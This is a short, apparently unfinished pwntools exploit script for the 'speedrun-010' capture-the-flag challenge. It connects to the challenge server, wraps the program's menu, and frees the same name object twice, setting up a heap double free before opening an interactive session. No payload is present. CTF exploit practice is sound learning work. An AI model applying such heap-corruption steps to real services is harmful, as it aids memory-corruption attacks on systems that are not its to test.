from pwn import *

#p = process('./speedrun-010')
p = remote('speedrun-010.quals2019.oooverflow.io',31337)
elf = ELF('./speedrun-010')
context.log_level = 'debug'

def add1(name):
    p.sendafter('4, or 5\n','1')
    p.sendafter('Need a name\n',name)

def add2(content):
    p.sendafter('4, or 5\n','2')
    p.sendafter('Need a message\n',content)

def delete1():
    p.sendafter('4, or 5\n','3')

def delete2():
    p.sendafter('4, or 5\n','4')
    
add1('y'*0x17)
add2('A'*0x18)
delete1()
delete1()
#add2('A'*0x18)
#gdb.attach(p)

p.interactive()
